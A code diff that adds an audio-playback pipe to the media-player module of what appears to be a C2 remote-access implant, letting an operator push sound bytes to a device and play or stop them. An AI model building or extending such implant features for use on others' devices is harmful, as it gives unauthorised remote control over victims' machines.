@@ -29,6 +29,7 @@
 #include <c2.h>
 #include <tlv.h>
 #include <tlv_types.h>
+#include <pipe.h>
 
 #import <MediaPlayer/MediaPlayer.h>
 
@@ -55,9 +56,16 @@
                        PLAYER_BASE, \
                        API_CALL + 4)
 
+#define PLAYER_PIPE_WAVE \
+        TLV_PIPE_CUSTOM(PIPE_STATIC, \
+                        PLAYER_BASE, \
+                        PIPE_TYPE)
+
 #define TLV_TYPE_PLAYER_TITLE  TLV_TYPE_CUSTOM(TLV_TYPE_INT, CAM_BASE, API_TYPE)
 #define TLV_TYPE_PLAYER_ALBUM  TLV_TYPE_CUSTOM(TLV_TYPE_INT, CAM_BASE, API_TYPE + 1)
 #define TLV_TYPE_PLAYER_ARTIST TLV_TYPE_CUSTOM(TLV_TYPE_INT, CAM_BASE, API_TYPE + 2)
+
+AVAudioPlayer *audio;
 
 typedef NS_ENUM(NSInteger, MRCommand) {
     kMRPlay = 0,
@@ -66,6 +74,11 @@ typedef NS_ENUM(NSInteger, MRCommand) {
     kMRPreviousTrack = 5,
 };
 Boolean MRMediaRemoteSendCommand(MRCommand command, id userInfo);
+
+@interface VolumeControl : NSObject
++(id)sharedVolumeControl;
+-(void)toggleMute;
+@end
 
 static tlv_pkt_t *player_info(c2_t *c2)
 {
@@ -125,6 +138,46 @@ static tlv_pkt_t *player_back(c2_t *c2)
     return api_craft_tlv_pkt(API_CALL_SUCCESS);
 }
 
+static int player_wave_create(pipe_t *pipe, c2_t *c2)
+{
+    int size;
+    NSData *data;
+    NSError *error;
+    unsigned char *buffer;
+
+    size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &buffer);
+    log_debug("* Loaded bytes for audio wave (%d)\n", size);
+
+    if (size <= 0)
+    {
+        return -1;
+    }
+
+    @autoreleasepool
+    {
+        data = [NSData dataWithBytes:(const void *)buffer length:size];
+        audio = [[AVAudioPlayer alloc] initWithData:data error:&error];
+
+        if (![audio play])
+        {
+            log_debug("* Failed to play audio (%s)\n", [error.localizedDescription UTF8String]);
+        }
+    }
+
+    free(buffer);
+    return 0;
+}
+
+static int player_wave_destroy(pipe_t *pipe, c2_t *c2)
+{
+    @autoreleasepool
+    {
+        [audio stop];
+    }
+
+    return 0;
+}
+
 void register_player_api_calls(api_calls_t **api_calls)
 {
     api_call_register(api_calls, PLAYER_INFO, player_info);
@@ -132,6 +185,16 @@ void register_player_api_calls(api_calls_t **api_calls)
     api_call_register(api_calls, PLAYER_PAUSE, player_pause);
     api_call_register(api_calls, PLAYER_NEXT, player_next);
     api_call_register(api_calls, PLAYER_BACK, player_back);
+}
+
+void register_player_api_pipes(pipes_t **pipes)
+{
+    pipe_callbacks_t callbacks;
+
+    callbacks.create_cb = player_wave_create;
+    callbacks.destroy_cb = player_wave_destroy;
+
+    api_pipe_register(pipes, PLAYER_PIPE_WAVE, callbacks);
 }
 
 #endif
